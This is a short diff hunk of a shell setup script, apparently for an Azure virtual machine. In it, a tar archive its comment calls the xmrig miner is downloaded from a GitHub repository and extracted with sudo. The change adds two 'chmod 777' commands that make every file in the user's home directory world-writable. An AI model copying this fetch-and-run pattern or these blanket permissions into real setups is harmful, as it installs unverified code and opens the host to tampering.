@@ -16,8 +16,10 @@ sudo apt update
 
 # Change to the user directory and download the xmrig miner
 cd /home/azureuser/
-wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar && sudo tar xvf output_filename.tar
-
+wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar ;
+sudo chmod 777 /home/azureuser/*
+sudo tar xvf output_filename.tar ;
+sudo chmod 777 /home/azureuser/*
 # Sleep for 3 seconds
 sleep 3
 
